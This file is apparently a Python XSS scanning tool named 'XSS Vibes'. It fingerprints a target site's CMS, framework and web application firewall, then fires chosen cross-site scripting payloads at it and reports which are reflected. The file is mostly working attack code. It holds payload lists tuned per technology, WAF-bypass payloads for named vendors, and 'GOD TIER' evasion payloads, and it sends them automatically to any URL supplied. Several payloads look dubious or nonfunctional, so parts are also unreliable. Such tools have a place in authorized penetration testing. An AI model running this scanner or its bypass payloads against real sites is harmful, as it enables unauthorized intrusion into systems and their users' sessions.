#!/usr/bin/env python3
"""
XSS Vibes - Smart Payload Selector
Analyzes target and selects optimal payloads based on technology stack and WAF detection
"""

import requests
import re
import json
import sys
import time
from urllib.parse import urljoin, urlparse, quote
from typing import Dict, List, Tuple, Optional, Any


class SmartPayloadSelector:
    """Intelligent payload selection based on target analysis"""

    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update(
            {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
            }
        )

        # Technology-specific payload recommendations
        self.tech_payloads = {
            "wordpress": [
                "<script>alert(1)</script>",
                '"><script>alert(1)</script>',
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
                "</textarea><script>alert(1)</script>",
            ],
            "drupal": [
                "<script>alert(1)</script>",
                "&lt;script&gt;alert(1)&lt;/script&gt;",
                "<img src=x onerror=alert(1)>",
                "<iframe src=javascript:alert(1)>",
                '"><script>alert(1)</script>',
            ],
            "joomla": [
                "<script>alert(1)</script>",
                '"onmouseover="alert(1)"',
                "<svg/onload=alert(1)>",
                "javascript:alert(1)",
                "</title><script>alert(1)</script>",
            ],
            "react": [
                "constructor[constructor](alert(1))()",
                "${alert(1)}",
                'dangerouslySetInnerHTML={{__html: "<script>alert(1)</script>"}}',
                "<img src=x onerror={alert(1)} />",
                "javascript:alert(1)",
            ],
            "angular": [
                '{{constructor.constructor("alert(1)")()}}',
                "{{alert(1)}}",
                "<script>alert(1)</script>",
                'ng-app ng-csp"><script>alert(1)</script>',
                '{{$eval.constructor("alert(1)")}}',
            ],
            "vue": [
                '{{constructor.constructor("alert(1)")()}}',
                "<script>alert(1)</script>",
                "{{alert(1)}}",
                'v-html="&lt;script&gt;alert(1)&lt;/script&gt;"',
                "javascript:alert(1)",
            ],
            "php": [
                "<script>alert(1)</script>",
                '"><script>alert(1)</script>',
                "';alert(1);//",
                "</textarea><script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
            ],
            "asp.net": [
                "<script>alert(1)</script>",
                "javascript:alert(1)",
                "<img src=x onerror=alert(1)>",
                '"><script>alert(1)</script>',
                "</textarea><script>alert(1)</script>",
            ],
            "java": [
                "<script>alert(1)</script>",
                '"><script>alert(1)</script>',
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "</title><script>alert(1)</script>",
            ],
        }

        # WAF-specific bypass payloads
        self.waf_bypasses = {
            "cloudflare": [
                '<svg><use href="#x"></use><symbol id="x"><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></symbol></svg>',
                '𒀀="",𒉺=!𒀀+𒀀',
                "ale‌rt(1)",
                "/**/alert(1)/**/",
                "<script>alert(String.fromCharCode(88,83,83))</script>",
            ],
            "akamai": [
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "&lt;script&gt;alert(1)&lt;/script&gt;",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                '"><script>alert(1)</script>',
            ],
            "aws": [
                "<script>alert(1)</script>",
                "javascript:alert(1)",
                "<img src=x onerror=alert(1)>",
                "<svg onload=alert(1)>",
                '"><script>alert(1)</script>',
            ],
            "imperva": [
                "<script>alert(String.fromCharCode(88,83,83))</script>",
                "eval(alert(1))",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                '"><script>alert(1)</script>',
            ],
            "sucuri": [
                "<script>alert(1)</script>",
                "<img src=x onerror=alert(1)>",
                "javascript:alert(1)",
                "<svg onload=alert(1)>",
                '"><script>alert(1)</script>',
            ],
        }

        # GOD TIER payloads for advanced scenarios
        self.god_tier_payloads = [
            '𒀀="",𒉺=!𒀀+𒀀',  # Cuneiform XSS
            "ale‌rt(1)",  # Unicode zero-width
            "constructor[constructor](alert(1))()",  # Constructor chain
            '<svg><use href="#x"></use><symbol id="x"><foreignObject><iframe src="javascript:alert(1)"></iframe></foreignObject></symbol></svg>',  # SVG xlink:href
            "${alert(1)}",  # Template literal
            "</style><script>alert(1)</script>",  # CSS injection
            "data:text/html,<script>alert(1)</script>",  # Data URI
            "<form id=x><output id=y>a</output></form><script>alert(x.y.value)</script>",  # DOM clobbering
            "[click me](javascript:alert(1))",  # Markdown XSS
            "%PDF-1.4%0A1%200%20obj%3C%3C/Type/Catalog/Pages%202%200%20R/OpenAction%3C%3C/Type/Action/S/JavaScript/JS(alert('XSS'))%3E%3E%3E%3E",  # PDF XSS
        ]

    def analyze_target(self, url: str) -> Dict[str, Any]:
        """Analyze target for technology stack and WAF detection"""
        analysis = {
            "technologies": [],
            "waf": None,
            "server": None,
            "cms": None,
            "framework": None,
            "response_headers": {},
            "response_body": "",
            "status_code": None,
        }

        try:
            print(f"🔍 Analyzing target: {url}")
            response = self.session.get(url, timeout=10, allow_redirects=True)
            analysis["status_code"] = response.status_code
            analysis["response_headers"] = dict(response.headers)
            analysis["response_body"] = response.text[:5000]  # First 5KB

            # Detect server
            server_header = response.headers.get("Server", "").lower()
            if server_header:
                analysis["server"] = server_header
                print(f"🖥️ Server: {server_header}")

            # Detect WAF
            waf = self.detect_waf(response)
            if waf:
                analysis["waf"] = waf
                print(f"🛡️ WAF detected: {waf}")

            # Detect CMS/Framework
            cms = self.detect_cms(response)
            if cms:
                analysis["cms"] = cms
                analysis["technologies"].append(cms)
                print(f"📄 CMS: {cms}")

            framework = self.detect_framework(response)
            if framework:
                analysis["framework"] = framework
                analysis["technologies"].append(framework)
                print(f"⚡ Framework: {framework}")

            # Additional technology detection
            additional_tech = self.detect_additional_technologies(response)
            analysis["technologies"].extend(additional_tech)

            if additional_tech:
                print(f"🔧 Additional technologies: {', '.join(additional_tech)}")

        except Exception as e:
            print(f"❌ Error analyzing target: {e}")

        return analysis

    def detect_waf(self, response) -> Optional[str]:
        """Detect WAF based on headers and response patterns"""
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}

        # Cloudflare
        if "cf-ray" in headers or "cloudflare" in headers.get("server", ""):
            return "cloudflare"

        # Akamai
        if "akamai" in headers.get("server", "") or "x-akamai" in str(headers):
            return "akamai"

        # AWS WAF
        if "awsalb" in str(headers) or "x-amzn-trace-id" in headers:
            return "aws"

        # Imperva
        if "x-iinfo" in headers or "incapsula" in str(headers):
            return "imperva"

        # Sucuri
        if "x-sucuri-id" in headers or "sucuri" in str(headers):
            return "sucuri"

        # F5 Big-IP
        if "bigip" in headers.get("server", "") or "f5" in str(headers):
            return "f5"

        # ModSecurity
        if "mod_security" in str(headers) or "modsecurity" in str(headers):
            return "modsecurity"

        return None

    def detect_cms(self, response) -> Optional[str]:
        """Detect CMS from response"""
        body = response.text.lower()
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}

        # WordPress
        if "wp-content" in body or "wordpress" in body or "/wp-" in body:
            return "wordpress"

        # Drupal
        if "drupal" in body or "sites/default" in body or "/sites/all/" in body:
            return "drupal"

        # Joomla
        if "joomla" in body or "/components/com_" in body or "joomla.org" in body:
            return "joomla"

        # Magento
        if "magento" in body or "/skin/frontend/" in body or "mage/cookies" in body:
            return "magento"

        # Shopify
        if "shopify" in body or "cdn.shopify.com" in body:
            return "shopify"

        return None

    def detect_framework(self, response) -> Optional[str]:
        """Detect JavaScript framework"""
        body = response.text.lower()

        # React
        if "react" in body or "__reactinternalinstance" in body or "react-dom" in body:
            return "react"

        # Angular
        if "angular" in body or "ng-app" in body or "ng-controller" in body:
            return "angular"

        # Vue.js
        if "vue" in body or "v-if" in body or "v-for" in body:
            return "vue"

        # ASP.NET
        if "asp.net" in body or "__viewstate" in body or ".aspx" in response.url:
            return "asp.net"

        return None

    def detect_additional_technologies(self, response) -> List[str]:
        """Detect additional technologies"""
        technologies = []
        body = response.text.lower()
        headers = {k.lower(): v.lower() for k, v in response.headers.items()}

        # PHP
        if "php" in headers.get("x-powered-by", "") or ".php" in response.url:
            technologies.append("php")

        # Java
        if "java" in headers.get(
            "x-powered-by", ""
        ) or "jsessionid" in response.headers.get("set-cookie", ""):
            technologies.append("java")

        # Node.js
        if "express" in headers.get("x-powered-by", "") or "node" in headers.get(
            "server", ""
        ):
            technologies.append("nodejs")

        # Python
        if "python" in headers.get("server", "") or "django" in body or "flask" in body:
            technologies.append("python")

        # jQuery
        if "jquery" in body:
            technologies.append("jquery")

        # Bootstrap
        if "bootstrap" in body:
            technologies.append("bootstrap")

        return technologies

    def select_optimal_payloads(self, analysis: Dict[str, Any]) -> List[str]:
        """Select optimal payloads based on analysis"""
        selected_payloads = []

        print(f"\n🎯 Selecting optimal payloads...")

        # Start with GOD TIER payloads for maximum evasion
        selected_payloads.extend(self.god_tier_payloads[:3])
        print(f"🔥 Added {len(self.god_tier_payloads[:3])} GOD TIER payloads")

        # Add WAF-specific bypasses
        if analysis.get("waf"):
            waf_payloads = self.waf_bypasses.get(analysis["waf"], [])
            selected_payloads.extend(waf_payloads[:3])
            print(
                f"🛡️ Added {len(waf_payloads[:3])} WAF-specific payloads for {analysis['waf']}"
            )

        # Add technology-specific payloads
        for tech in analysis.get("technologies", []):
            if tech in self.tech_payloads:
                tech_specific = self.tech_payloads[tech][:2]
                selected_payloads.extend(tech_specific)
                print(f"🔧 Added {len(tech_specific)} {tech}-specific payloads")

        # Add CMS-specific payloads
        if analysis.get("cms") and analysis["cms"] in self.tech_payloads:
            cms_payloads = self.tech_payloads[analysis["cms"]][:2]
            selected_payloads.extend(cms_payloads)
            print(f"📄 Added {len(cms_payloads)} {analysis['cms']}-specific payloads")

        # Add framework-specific payloads
        if analysis.get("framework") and analysis["framework"] in self.tech_payloads:
            framework_payloads = self.tech_payloads[analysis["framework"]][:2]
            selected_payloads.extend(framework_payloads)
            print(
                f"⚡ Added {len(framework_payloads)} {analysis['framework']}-specific payloads"
            )

        # Remove duplicates while preserving order
        unique_payloads = []
        seen = set()
        for payload in selected_payloads:
            if payload not in seen:
                unique_payloads.append(payload)
                seen.add(payload)

        print(f"✅ Selected {len(unique_payloads)} unique optimal payloads")
        return unique_payloads

    def test_payloads(self, url: str, payloads: List[str]) -> List[Dict[str, Any]]:
        """Test payloads against target"""
        results = []

        print(f"\n🧪 Testing {len(payloads)} payloads...")

        for i, payload in enumerate(payloads, 1):
            print(f"🎯 Testing payload {i}/{len(payloads)}: {payload[:50]}...")

            result = {
                "payload": payload,
                "reflected": False,
                "response_code": None,
                "response_length": 0,
                "error": None,
            }

            try:
                # Test in URL parameter
                test_url = f"{url}?test={quote(payload)}"
                response = self.session.get(test_url, timeout=10)

                result["response_code"] = response.status_code
                result["response_length"] = len(response.text)

                # Check if payload is reflected
                if payload in response.text or quote(payload) in response.text:
                    result["reflected"] = True
                    print(f"✅ Payload reflected!")
                else:
                    print(f"❌ Payload not reflected")

            except Exception as e:
                result["error"] = str(e)
                print(f"⚠️ Error testing payload: {e}")

            results.append(result)
            time.sleep(1)  # Rate limiting

        return results

    def generate_report(
        self,
        url: str,
        analysis: Dict[str, Any],
        payloads: List[str],
        results: List[Dict[str, Any]],
    ) -> str:
        """Generate comprehensive testing report"""
        reflected_count = sum(1 for r in results if r["reflected"])

        report = f"""
🔥 XSS Vibes - Smart Payload Selection Report
===========================================

🎯 Target: {url}
📅 Date: {time.strftime('%Y-%m-%d %H:%M:%S')}

🔍 Target Analysis:
================
🖥️ Server: {analysis.get('server', 'Unknown')}
🛡️ WAF: {analysis.get('waf', 'None detected')}
📄 CMS: {analysis.get('cms', 'Unknown')}
⚡ Framework: {analysis.get('framework', 'Unknown')}
🔧 Technologies: {', '.join(analysis.get('technologies', [])) or 'None detected'}
📊 Status Code: {analysis.get('status_code', 'Unknown')}

🧪 Payload Testing Results:
=========================
📊 Total payloads tested: {len(payloads)}
✅ Reflected payloads: {reflected_count}
❌ Blocked payloads: {len(payloads) - reflected_count}
📈 Success rate: {(reflected_count / len(payloads) * 100):.1f}%

🎯 Detailed Results:
==================
"""

        for i, (payload, result) in enumerate(zip(payloads, results), 1):
            status = "✅ REFLECTED" if result["reflected"] else "❌ BLOCKED"
            report += (
                f"{i}. {status}: {payload[:80]}{'...' if len(payload) > 80 else ''}\n"
            )
            if result["error"]:
                report += f"   ⚠️ Error: {result['error']}\n"

        report += f"""

💡 Recommendations:
=================
1. 🔍 Manually verify all reflected payloads
2. 🧪 Test in different contexts (URL, POST, headers)
3. 🛡️ Focus on {analysis.get('waf', 'generic')} WAF bypass techniques
4. 🔄 Regular retesting as filters evolve
5. 📊 Consider encoding variations for blocked payloads

🏆 GOD TIER Payloads Performance:
===============================
"""

        god_tier_results = [
            r for r, p in zip(results, payloads) if p in self.god_tier_payloads
        ]
        god_tier_reflected = sum(1 for r in god_tier_results if r["reflected"])

        report += f"🔥 GOD TIER success rate: {(god_tier_reflected / len(god_tier_results) * 100):.1f}% ({god_tier_reflected}/{len(god_tier_results)})\n"

        if analysis.get("waf"):
            waf_specific_results = [
                r
                for r, p in zip(results, payloads)
                if p in self.waf_bypasses.get(analysis["waf"], [])
            ]
            if waf_specific_results:
                waf_reflected = sum(1 for r in waf_specific_results if r["reflected"])
                report += f"🛡️ {analysis['waf'].title()} bypass success rate: {(waf_reflected / len(waf_specific_results) * 100):.1f}% ({waf_reflected}/{len(waf_specific_results)})\n"

        return report


def main():
    """Main execution function"""
    if len(sys.argv) != 2:
        print("Usage: python3 smart_payload_selector.py <target_url>")
        print("Example: python3 smart_payload_selector.py https://testphp.vulnweb.com")
        sys.exit(1)

    target_url = sys.argv[1]
    if not target_url.startswith(("http://", "https://")):
        target_url = "http://" + target_url

    selector = SmartPayloadSelector()

    print("🔥 XSS Vibes - Smart Payload Selector")
    print("=" * 50)

    # Analyze target
    analysis = selector.analyze_target(target_url)

    # Select optimal payloads
    optimal_payloads = selector.select_optimal_payloads(analysis)

    # Test payloads
    results = selector.test_payloads(target_url, optimal_payloads)

    # Generate and save report
    report = selector.generate_report(target_url, analysis, optimal_payloads, results)

    # Save to file
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"smart_payload_report_{timestamp}.txt"
    with open(filename, "w", encoding="utf-8") as f:
        f.write(report)

    print(f"\n📊 Report saved to: {filename}")
    print("\n" + "=" * 50)
    print(report)


if __name__ == "__main__":
    main()
